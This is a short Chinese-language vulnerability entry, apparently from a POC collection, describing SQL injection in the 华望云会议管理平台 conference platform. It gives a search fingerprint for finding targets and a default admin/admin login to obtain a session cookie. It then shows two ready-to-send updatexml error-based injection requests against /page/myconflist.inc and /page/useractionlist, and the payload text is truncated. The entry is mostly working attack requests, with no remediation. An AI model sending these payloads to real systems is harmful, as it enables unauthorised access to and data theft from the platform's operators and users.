# 华望云会议管理平台多处存在SQL注入漏洞

- **系统**：华望云会议管理平台多处　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title=" 华望云会议管理平台 "`
- **请求**：`POST /ajax/userlogin HTTP/1.1`

**请求体 / payload**
```
获取cookie
Host:
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
userNameCopy=admin&userName=admin&passWordCopy=admin&passWord=21232f297a57a5a743894a0e4a801fc3
注入1：
GET /page/myconflist.inc?search=1%25'+and+1%3d(updatexml(0x7e,concat(1,(select+user())),1))+and+'%25%25'+like+'&params[]=confName&params[]=confId&selectTime=1 HTTP/1.1
Host:
X-Requested-With: XMLHttpRequest
Cookie: uid=112; JSESSIONID=cookie; languageGlobal=1
注入2：
POST /page/useractionlist?search=1%25'+and+1%3d(updatexml(0x7e,concat(1,(select+user())),1))+and+'%25%25'+like+'&dpId=1&para…（脚本共 2611 字，完整版见原文）
```
- **预期**：200　|　—